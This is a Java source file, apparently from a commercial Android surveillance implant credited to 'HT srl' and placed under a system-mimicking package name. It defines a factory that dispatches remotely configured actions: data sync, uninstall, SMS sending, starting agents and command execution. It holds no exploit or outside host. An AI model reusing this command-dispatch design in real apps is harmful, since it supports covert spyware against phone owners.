/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 03-dec-2010
 **********************************************/

package com.android.service.action;

import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class SubAction.
 */
public abstract class SubAction implements Runnable {

	private static final String TAG = "SubAction";

	/** Action type. */
	private final int subActionType;

	/** Parameters. */
	private final byte[] subActionParams;

	/** The want uninstall. */
	//protected boolean wantUninstall;

	/** The want reload. */
	//protected boolean wantReload;

	/** The status. */
	Status status;

	/**
	 * Instantiates a new sub action.
	 * 
	 * @param actionType
	 *            the type
	 * @param params
	 *            the params
	 */
	public SubAction(final int actionType, final byte[] params) {
		this.subActionType = actionType;
		this.subActionParams = params;
		this.status = Status.self();

		parse(params);
	}

	/**
	 * Factory.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 * @return the sub action
	 */
	public static SubAction factory(final int type, final byte[] confParams) {

		switch (type) {
			case SubActionType.ACTION_SYNC:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_SYNC ***");
				return new SyncActionInternet(type, confParams);

			case SubActionType.ACTION_UNINSTALL:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_UNINSTALL ***");
				return new UninstallAction(type, confParams);

			case SubActionType.ACTION_RELOAD:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_RELOAD ***");
				return new ReloadAction(type, confParams);

			case SubActionType.ACTION_SMS:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_SMS ***");
				return new SmsAction(type, confParams);

			case SubActionType.ACTION_START_AGENT:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_START_AGENT ***");
				return new StartAgentAction(type, confParams);

			case SubActionType.ACTION_STOP_AGENT:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_STOP_AGENT ***");
				return new StopAgentAction(type, confParams);

			case SubActionType.ACTION_SYNC_PDA:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_SYNC_PDA ***");
				return new SyncPdaAction(type, confParams);

			case SubActionType.ACTION_EXECUTE:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_EXECUTE ***");
				return new ExecuteAction(type, confParams);

			case SubActionType.ACTION_SYNC_APN:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_SYNC ***");
				return new SyncActionApn(type, confParams);

			case SubActionType.ACTION_LOG:
				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_INFO ***");
				return new LogAction(type, confParams);

			default:
				return null;
		}
	}

	/**
	 * Gets the sub action type.
	 * 
	 * @return the sub action type
	 */
	public int getSubActionType() {
		return subActionType;
	}

	/**
	 * Gets the sub action params.
	 * 
	 * @return the sub action params
	 */
	public byte[] getSubActionParams() {
		return subActionParams;
	}

	/** The finished. */
	private boolean finished;

	/**
	 * Parse
	 * 
	 * @param params
	 *            byte array from configuration
	 */
	protected abstract boolean parse(final byte[] params);

	/**
	 * Execute.
	 * 
	 * @return true, if successful
	 */
	public abstract boolean execute();

	/**
	 * Checks if is finished.
	 * 
	 * @return true, if is finished
	 */
	public synchronized boolean isFinished() {
		return finished;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		try {
			execute();
		} catch (Exception e) {
			if(Cfg.DEBUG) { Check.log(e); }
		} finally {
			synchronized (this) {
				notify();
				finished = true;
			}
		}
	}

	/**
	 * Prepare execute.
	 */
	public void prepareExecute() {
		synchronized (this) {
			finished = false;
		}
	}


}
